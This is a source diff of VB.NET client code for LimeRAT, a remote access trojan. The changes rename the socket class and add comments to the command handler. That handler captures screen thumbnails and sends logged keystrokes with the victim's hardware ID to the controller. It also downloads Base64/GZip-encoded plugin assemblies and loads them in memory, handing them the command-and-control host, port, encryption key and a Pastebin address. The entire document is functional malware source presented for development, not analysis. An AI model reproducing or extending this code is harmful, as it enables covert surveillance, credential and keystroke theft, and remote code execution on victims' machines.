@@ -11,14 +11,14 @@
             Try
                 Select Case A(0)
 
-                    Case "!PSend"
-                        C_Socket._start = True
-                        C_Socket.Send("!PStart")
+                    Case "!PSend" 'Ask client to run timer
+                        C_TcpClient.P_Start = True
+                        C_TcpClient.Send("!PStart")
 
-                    Case "!P"
-                        C_Socket._stop = True
+                    Case "!P" 'Ask client to stop timer
+                        C_TcpClient.P_Stop = True
 
-                    Case "!CAP"
+                    Case "!CAP" 'Thumbnail
                         Try
                             Dim bounds As Drawing.Rectangle = Windows.Forms.Screen.PrimaryScreen.Bounds
                             Dim image As New Drawing.Bitmap(Windows.Forms.Screen.PrimaryScreen.Bounds.Width, bounds.Height, Drawing.Imaging.PixelFormat.Format16bppRgb555)
@@ -30,45 +30,49 @@
                             Dim G As Drawing.Graphics = Drawing.Graphics.FromImage(THU)
                             G.DrawImage(image, New Drawing.Rectangle(0, 0, 256, 156), New Drawing.Rectangle(0, 0, image.Width, image.Height), Drawing.GraphicsUnit.Pixel)
                             THU.Save(MM, System.Drawing.Imaging.ImageFormat.Jpeg)
-                            C_Socket.Send("#CAP" & SPL & C_ID.Bot & SPL & Text.Encoding.Default.GetString(MM.ToArray))
-                            MM.Dispose()
-                            THU.Dispose()
-                            G.Dispose()
-                            image.Dispose()
+                            C_TcpClient.Send("#CAP" & SPL & C_ID.Bot & SPL & Text.Encoding.Default.GetString(MM.ToArray))
+                            Try
+                                MM.Dispose()
+                                THU.Dispose()
+                                G.Dispose()
+                                image.Dispose()
+                            Catch : End Try
                         Catch ex As Exception
                         End Try
 
                     Case "KL"
-                        C_Socket.Send("KL" + SPL + C_ID.HWID + SPL + IO.File.ReadAllText(IO.Path.GetTempPath + "\" + IO.Path.GetFileNameWithoutExtension(Windows.Forms.Application.ExecutablePath) + ".tmp"))
+                        C_TcpClient.Send("KL" + SPL + C_ID.HWID + SPL + IO.File.ReadAllText(IO.Path.GetTempPath + "\" + IO.Path.GetFileNameWithoutExtension(Windows.Forms.Application.ExecutablePath) + ".tmp"))
 
-                    Case "CPL" 'check plugin
+                    Case "CPL" 'check if plugin in installed, or ask server to send it
                         If GTV(A(1)) = Nothing Then
-                            C_Socket.Send("GPL" + SPL + A(1))
+                            C_TcpClient.Send("GPL" + SPL + A(1))
                         Else
                             Plugin(GZip(Convert.FromBase64String(GTV(A(1))), False))
                         End If
 
-                    Case "IPL" 'invo plugin
+                    Case "IPL" 'server send plugin. save it then load it
                         STV(A(2), A(1))
                         Plugin(GZip(Convert.FromBase64String(GTV(A(2))), False))
 
-                    Case "IPLM"
+                    Case "IPLM" 'server send plugin. load it without saving it.
                         Plugin(GZip(Convert.FromBase64String(A(1)), False), A(2))
                 End Select
             Catch ex As Exception
-                C_Socket.Send("MSG" + SPL + "Error! " + ex.Message)
+                C_TcpClient.Send("MSG" + SPL + "Error! " + ex.Message)
             End Try
 
         End Sub
 
+        'I can change this method with better one but I have to re-write plugins method name.
+        'Also if you update this method you have to use old LimeRAT to update your clients.
         Public Shared Sub Plugin(ByVal B() As Byte, Optional CMD As String = Nothing)
             Try
-                C_Socket.Send("OK")
+                C_TcpClient.Send("OK" + SPL + C_ID.HWID + SPL + C_ID.UserName)
 
                 For Each Type_ As Type In AppDomain.CurrentDomain.Load(B).GetTypes
                     For Each GM In Type_.GetMethods
                         If GM.Name = "CN" Then
-                            GM.Invoke(Nothing, New Object() {C_Settings.HOST, C_Settings.PORT, C_Socket.ENDOF, C_Socket.SPL, C_Settings.EncryptionKey, C_Settings.fullpath, C_ID.HWID, C_ID.Bot, C_Encryption.AES_Decrypt(C_Settings.Pastebin)})
+                            GM.Invoke(Nothing, New Object() {C_Settings.HOST, C_Settings.PORT, C_TcpClient.ENDOF, C_TcpClient.SPL, C_Settings.EncryptionKey, C_Settings.fullpath, C_ID.HWID, C_ID.Bot, C_Encryption.AES_Decrypt(C_Settings.Pastebin)})
                         ElseIf GM.Name = "MISC" Then
                             GM.Invoke(Nothing, New Object() {C_ID.HWID, CMD})
                         ElseIf GM.Name = "CL" Then
@@ -77,7 +81,7 @@
                     Next
                 Next
             Catch ex As Exception
-                C_Socket.Send("MSG" + SPL + "Plugin Error! " + ex.Message)
+                C_TcpClient.Send("MSG" + SPL + "Plugin Error! " + ex.Message)
             End Try
         End Sub
 
